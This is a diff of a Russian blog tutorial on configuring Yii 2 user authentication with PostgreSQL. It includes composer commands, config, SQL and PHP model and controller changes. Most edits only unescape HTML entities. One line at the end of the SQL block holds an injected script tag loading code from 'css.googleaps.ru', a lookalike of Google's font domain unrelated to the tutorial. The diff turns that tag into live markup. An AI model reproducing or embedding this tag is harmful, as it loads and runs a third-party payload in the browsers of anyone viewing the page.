@@ -30,31 +30,31 @@ tags:
 comments: []
 ---
 <div dir="ltr" style="text-align: left;">попробуем разобраться как работает авторизация в yii 2.если начинаете с нуля то</p>
-<pre><code>   composer global require "fxp&#47;composer-asset-plugin:~1.0.0"<br />
-   composer create-project --prefer-dist yiisoft&#47;yii2-app-advanced  yii2rbac<br />
+<pre><code>   composer global require "fxp/composer-asset-plugin:~1.0.0"<br />
+   composer create-project --prefer-dist yiisoft/yii2-app-advanced  yii2rbac<br />
    cd yii2rbac<br />
    php init --env=Development<br />
-   php yii migrate<&#47;code><&#47;pre><br />
+   php yii migrate</code></pre><br />
 перед миграцией нужно настроить подключение к базе.</p>
 <p>в localhostyii2rbaccommonconfigmain-local.php поменяем</p>
 <pre><code>&nbsp;&nbsp;&nbsp; 'components' => [<br />
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'db' => require(__DIR__ . '&#47;db.php'),<&#47;code><&#47;pre><br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'db' => require(__DIR__ . '/db.php'),</code></pre><br />
 создадим под коннект файл db.php</p>
-<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;3.bp.blogspot.com&#47;-GWi5Q03afH8&#47;VYzb8PP1zdI&#47;AAAAAAAAAgo&#47;seKus8akpIw&#47;s1600&#47;Screenshot_1.png"><img src="http:&#47;&#47;3.bp.blogspot.com&#47;-GWi5Q03afH8&#47;VYzb8PP1zdI&#47;AAAAAAAAAgo&#47;seKus8akpIw&#47;s1600&#47;Screenshot_1.png" alt="" border="0" &#47;><&#47;a><&#47;div><br />
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http://3.bp.blogspot.com/-GWi5Q03afH8/VYzb8PP1zdI/AAAAAAAAAgo/seKus8akpIw/s1600/Screenshot_1.png"><img src="http://3.bp.blogspot.com/-GWi5Q03afH8/VYzb8PP1zdI/AAAAAAAAAgo/seKus8akpIw/s1600/Screenshot_1.png" alt="" border="0" /></a></div><br />
 ну и зададим свои настройки</p>
 <pre><code> 'yiidbConnection',<br />
-    &#47;&#47;'dsn' => 'mysql:host=localhost;dbname=localdb',<br />
+    //'dsn' => 'mysql:host=localhost;dbname=localdb',<br />
     'dsn' => 'pgsql:host=***.ru;port=5432;dbname=DB_**',<br />
     'username' => 'postgres',<br />
     'password' => '****',<br />
     'schemaMap' => [<br />
         'pgsql' => [<br />
             'class' => 'yiidbpgsqlSchema',<br />
-            'defaultSchema' => 'yii2' &#47;&#47;specify your schema here<br />
+            'defaultSchema' => 'yii2' //specify your schema here<br />
         ]<br />
     ],<br />
     'charset' => 'utf8',<br />
-];<&#47;code><&#47;pre><br />
+];</code></pre><br />
 я использую Postgres - здесь еще нужно схему указать</p>
 <p>пошутил. конечно это не будет работать ))))</p>
 <p>в yii2rbaccommonmodelsUser.php</p>
@@ -62,11 +62,11 @@ comments: []
 <pre><code>    public static function tableName()<br />
     {<br />
         return 'yii2.{{%user}}';<br />
-    }<&#47;code><&#47;pre><br />
+    }</code></pre><br />
 тут пошли танцы с бубном. первоначальный вид таблицы мне конечно не понравился</p>
 <p>решил привести таблицу юзера к такому виду</p>
-<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;3.bp.blogspot.com&#47;-kKPv7Y7HBnE&#47;VY0QN6oI9vI&#47;AAAAAAAAAiM&#47;3yYewT_r9F0&#47;s1600&#47;Screenshot_9.png"><img src="http:&#47;&#47;3.bp.blogspot.com&#47;-kKPv7Y7HBnE&#47;VY0QN6oI9vI&#47;AAAAAAAAAiM&#47;3yYewT_r9F0&#47;s640&#47;Screenshot_9.png" alt="" width="640" height="202" border="0" &#47;><&#47;a><&#47;div></p>
-<div class="separator" style="clear: both; text-align: center;"><&#47;div><br />
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http://3.bp.blogspot.com/-kKPv7Y7HBnE/VY0QN6oI9vI/AAAAAAAAAiM/3yYewT_r9F0/s1600/Screenshot_9.png"><img src="http://3.bp.blogspot.com/-kKPv7Y7HBnE/VY0QN6oI9vI/AAAAAAAAAiM/3yYewT_r9F0/s640/Screenshot_9.png" alt="" width="640" height="202" border="0" /></a></div></p>
+<div class="separator" style="clear: both; text-align: center;"></div><br />
 ---<br />
 sql</p>
 <pre><code>CREATE TABLE yii2."user" (<br />
@@ -103,21 +103,21 @@ IS 'создан';</p>
 <p>COMMENT ON COLUMN yii2."user".ban_date<br />
 IS 'заблокирован';</p>
 <p>COMMENT ON COLUMN yii2."user".status<br />
-IS 'заблокировать';<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;code><&#47;pre><br />
+IS 'заблокировать';<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></code></pre><br />
 ---<br />
 на мой вкус username нужно бы поменять на login, а password_hash на password<br />
 но боялся грохнуть то что есть.</p>
 <p>пойдем по файлам</p>
 <p>localhostyii2rbaccommonmodelsUser.php</p>
 <p>комментим</p>
-<pre><code>&#47;&#47;use yiibehaviorsTimestampBehavior; <&#47;code><&#47;pre><br />
+<pre><code>//use yiibehaviorsTimestampBehavior; </code></pre><br />
 - нужно для временных (int это время? кхе-кхе) полей</p>
 <pre><code>    public function behaviors()<br />
     {<br />
         return [<br />
-         &#47;&#47;   TimestampBehavior::className(),<br />
+         //   TimestampBehavior::className(),<br />
         ];<br />
-    }<&#47;code><&#47;pre><br />
+    }</code></pre><br />
 тоже в топку</p>
 <p>yii2rbacfrontendmodelsSignupForm.php<br />
 сносим все что относится к емэйлу</p>
@@ -125,26 +125,26 @@ IS 'заблокировать';<script src="&#47;&#47;css.googleaps.ru&#47;css?
             ['username', 'required'],<br />
             ['username', 'unique', 'targetClass' => 'commonmodelsUser', 'message' => 'This username has already been taken.'],<br />
             ['username', 'string', 'min' => 2, 'max' => 255],<br />
-            &#47;&#47; [ 'filter', 'filter' => 'trim'],<br />
-            &#47;&#47; ['email', 'required'],<br />
-            &#47;&#47; ['email', 'email'],<br />
-            &#47;&#47; [ 'unique', 'targetClass' => 'commonmodelsUser', 'message' => 'This email address has already been taken.'],<br />
+            // [ 'filter', 'filter' => 'trim'],<br />
+            // ['email', 'required'],<br />
+            // ['email', 'email'],<br />
+            // [ 'unique', 'targetClass' => 'commonmodelsUser', 'message' => 'This email address has already been taken.'],<br />
             ['password', 'required'],<br />
             ['password', 'string', 'min' => 6],<br />
         ];<br />
     }</p>
-<p>    &#47;**<br />
+<p>    /**<br />
      * Signs user up.<br />
      *<br />
      * @return User|null the saved model or null if saving fails<br />
-     *&#47;<br />
+     */<br />
     public function signup()<br />
     {<br />
         if ($this->validate())<br />
         {<br />
             $user = new User();<br />
             $user->username = $this->username;<br />
-            &#47;&#47; $user->email = $this->email;<br />
+            // $user->email = $this->email;<br />
             $user->setPassword($this->password);<br />
             $user->generateAuthKey();<br />
             if ($user->save())<br />
@@ -154,23 +154,23 @@ IS 'заблокировать';<script src="&#47;&#47;css.googleaps.ru&#47;css?
         }<br />
         return null;<br />
     }<br />
-    }<&#47;code><&#47;pre><br />
+    }</code></pre><br />
 в yii2rbacfrontendviewssitesignup.php<br />
 удаляем поле мыла</p>
 <p>получаем примерно</p>
-<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;1.bp.blogspot.com&#47;-3qqTBXGmiUA&#47;VYzrN_bcTRI&#47;AAAAAAAAAhM&#47;UzaoVGWsNVY&#47;s1600&#47;Screenshot_4.png"><img src="http:&#47;&#47;1.bp.blogspot.com&#47;-3qqTBXGmiUA&#47;VYzrN_bcTRI&#47;AAAAAAAAAhM&#47;UzaoVGWsNVY&#47;s320&#47;Screenshot_4.png" alt="" width="320" height="212" border="0" &#47;><&#47;a><&#47;div><br />
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http://1.bp.blogspot.com/-3qqTBXGmiUA/VYzrN_bcTRI/AAAAAAAAAhM/UzaoVGWsNVY/s1600/Screenshot_4.png"><img src="http://1.bp.blogspot.com/-3qqTBXGmiUA/VYzrN_bcTRI/AAAAAAAAAhM/UzaoVGWsNVY/s320/Screenshot_4.png" alt="" width="320" height="212" border="0" /></a></div><br />
 создадим модель в gii</p>
-<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;2.bp.blogspot.com&#47;-B2_Y9RMQ0Po&#47;VYzsJR-E8II&#47;AAAAAAAAAhU&#47;QSGEV-W0Kl8&#47;s1600&#47;Screenshot_5.png"><img src="http:&#47;&#47;2.bp.blogspot.com&#47;-B2_Y9RMQ0Po&#47;VYzsJR-E8II&#47;AAAAAAAAAhU&#47;QSGEV-W0Kl8&#47;s320&#47;Screenshot_5.png" alt="" width="320" height="283" border="0" &#47;><&#47;a><&#47;div><br />
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http://2.bp.blogspot.com/-B2_Y9RMQ0Po/VYzsJR-E8II/AAAAAAAAAhU/QSGEV-W0Kl8/s1600/Screenshot_5.png"><img src="http://2.bp.blogspot.com/-B2_Y9RMQ0Po/VYzsJR-E8II/AAAAAAAAAhU/QSGEV-W0Kl8/s320/Screenshot_5.png" alt="" width="320" height="283" border="0" /></a></div><br />
 и круд</p>
-<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;2.bp.blogspot.com&#47;--9-s0rNCHkM&#47;VYz0Fc3qEPI&#47;AAAAAAAAAhk&#47;ctrOgr5DhjY&#47;s1600&#47;Screenshot_6.png"><img src="http:&#47;&#47;2.bp.blogspot.com&#47;--9-s0rNCHkM&#47;VYz0Fc3qEPI&#47;AAAAAAAAAhk&#47;ctrOgr5DhjY&#47;s320&#47;Screenshot_6.png" alt="" width="269" height="320" border="0" &#47;><&#47;a><&#47;div><br />
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http://2.bp.blogspot.com/--9-s0rNCHkM/VYz0Fc3qEPI/AAAAAAAAAhk/ctrOgr5DhjY/s1600/Screenshot_6.png"><img src="http://2.bp.blogspot.com/--9-s0rNCHkM/VYz0Fc3qEPI/AAAAAAAAAhk/ctrOgr5DhjY/s320/Screenshot_6.png" alt="" width="269" height="320" border="0" /></a></div><br />
 получим</p>
-<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;2.bp.blogspot.com&#47;-ipgE1bi_8X0&#47;VYz0aTXIatI&#47;AAAAAAAAAhs&#47;eZ2T0ZsWtRQ&#47;s1600&#47;Screenshot_7.png"><img src="http:&#47;&#47;2.bp.blogspot.com&#47;-ipgE1bi_8X0&#47;VYz0aTXIatI&#47;AAAAAAAAAhs&#47;eZ2T0ZsWtRQ&#47;s320&#47;Screenshot_7.png" alt="" width="159" height="320" border="0" &#47;><&#47;a><&#47;div><br />
-можете перейти по http:&#47;&#47;localhost&#47;yii2rbac&#47;backend&#47;web&#47;index.php&#47;user<br />
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http://2.bp.blogspot.com/-ipgE1bi_8X0/VYz0aTXIatI/AAAAAAAAAhs/eZ2T0ZsWtRQ/s1600/Screenshot_7.png"><img src="http://2.bp.blogspot.com/-ipgE1bi_8X0/VYz0aTXIatI/AAAAAAAAAhs/eZ2T0ZsWtRQ/s320/Screenshot_7.png" alt="" width="159" height="320" border="0" /></a></div><br />
+можете перейти по http://localhost/yii2rbac/backend/web/index.php/user<br />
 и увидите своего пользователя и захэшированный пароль</p>
 <p>ну а теперь создание и редактирование пользователей.<br />
 поправим форму ввода yii2rbacbackendviewsuser_form.php</p>
 <pre><code></p>
-<p><&#47;code><&#47;pre></p>
+<p></code></pre></p>
 <div class="my-user-form">
 field($model, 'username')->textInput(['maxlength' => true]) ?><br />
 field($model, 'password_hash')->textInput(['maxlength' => true])->passwordInput() ?><br />
@@ -180,21 +180,21 @@ field($model, 'created_at')->textInput(['disabled' => true]) ?><br />
 field($model, 'ban_date')->textInput(['disabled' => true]) ?><br />
 field($model, 'status')->textInput() ?></p>
 <div class="form-group">
-isNewRecord ? 'Create' : 'Update', ['class' => $model->isNewRecord ? 'btn btn-success' : 'btn btn-primary']) ?><&#47;div><br />
-<&#47;div></p>
-<pre><code>&nbsp;<&#47;code><&#47;pre><br />
+isNewRecord ? 'Create' : 'Update', ['class' => $model->isNewRecord ? 'btn btn-success' : 'btn btn-primary']) ?></div><br />
+</div></p>
+<pre><code>&nbsp;</code></pre><br />
 добавим в модель пару методов yii2rbacbackendmodelsMyUser.php</p>
-<pre><code>use commonmodelsUser;  вверху<&#47;code><&#47;pre></p>
-<pre><code>&nbsp;<&#47;code><&#47;pre></p>
+<pre><code>use commonmodelsUser;  вверху</code></pre></p>
+<pre><code>&nbsp;</code></pre></p>
 <pre><code>public function signup()<br />
     {<br />
         if ($this->validate())<br />
         {<br />
             $user = new User();<br />
             $user->username = $this->username;<br />
-            &#47;&#47; $user->email = $this->email;<br />
+            // $user->email = $this->email;<br />
             $user->setPassword($this->password_hash);<br />
-            &#47;&#47;$user->generateAuthKey();<br />
+            //$user->generateAuthKey();<br />
             if ($user->save())<br />
             {<br />
                 return $user;<br />
@@ -213,12 +213,12 @@ isNewRecord ? 'Create' : 'Update', ['class' => $model->isNewRecord ? 'btn btn-su
             }<br />
         }<br />
         return parent::beforeSave($insert);<br />
-    }<&#47;code><&#47;pre><br />
+    }</code></pre><br />
 в модели еще поправим</p>
 <pre><code>    public static function tableName()<br />
     {<br />
         return Yii::$app->params['pgschema'] . '.user';<br />
-    }<&#47;code><&#47;pre><br />
+    }</code></pre><br />
 а в yii2rbaccommonconfigparams.php добавим</p>
 <pre><code> 'admin@example.com',<br />
     'supportEmail' => 'support@example.com',<br />
@@ -226,7 +226,7 @@ isNewRecord ? 'Create' : 'Update', ['class' => $model->isNewRecord ? 'btn btn-su
     'domainName' => 'yii2rbac',<br />
     'pgschema' => 'yii2'<br />
 ];<br />
-<&#47;code><&#47;pre><br />
+</code></pre><br />
 и поправим контроллер yii2rbacbackendcontrollersUserController.php</p>
 <pre><code><br />
     public function actionCreate()<br />
@@ -256,11 +256,11 @@ isNewRecord ? 'Create' : 'Update', ['class' => $model->isNewRecord ? 'btn btn-su
                         'model' => $model,<br />
             ]);<br />
         }<br />
-    }<&#47;code><&#47;pre><br />
+    }</code></pre><br />
 ну вот наверно и все. можем убрать из меню signup и пользователь сможет заходить только по паролю из базы</p>
 <p>ну и в результате</p>
-<div class="separator" style="clear: both; text-align: center;"><&#47;div></p>
-<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;4.bp.blogspot.com&#47;-FedArQ92VrU&#47;VY0HDP39DcI&#47;AAAAAAAAAh8&#47;LA1j0n6xfdo&#47;s1600&#47;Screenshot_8.png"><img src="http:&#47;&#47;4.bp.blogspot.com&#47;-FedArQ92VrU&#47;VY0HDP39DcI&#47;AAAAAAAAAh8&#47;LA1j0n6xfdo&#47;s640&#47;Screenshot_8.png" alt="" width="640" height="214" border="0" &#47;><&#47;a><&#47;div><br />
-ну и следующая тема про<a href="http:&#47;&#47;des1roer.blogspot.ru&#47;2015&#47;06&#47;yii-2-rbac_29.html" target="_blank"> rbac<&#47;a></p>
-<p><&#47;div><br />
+<div class="separator" style="clear: both; text-align: center;"></div></p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http://4.bp.blogspot.com/-FedArQ92VrU/VY0HDP39DcI/AAAAAAAAAh8/LA1j0n6xfdo/s1600/Screenshot_8.png"><img src="http://4.bp.blogspot.com/-FedArQ92VrU/VY0HDP39DcI/AAAAAAAAAh8/LA1j0n6xfdo/s640/Screenshot_8.png" alt="" width="640" height="214" border="0" /></a></div><br />
+ну и следующая тема про<a href="http://des1roer.blogspot.ru/2015/06/yii-2-rbac_29.html" target="_blank"> rbac</a></p>
+<p></div><br />
 Source: des1roer.blogspot.com</p>
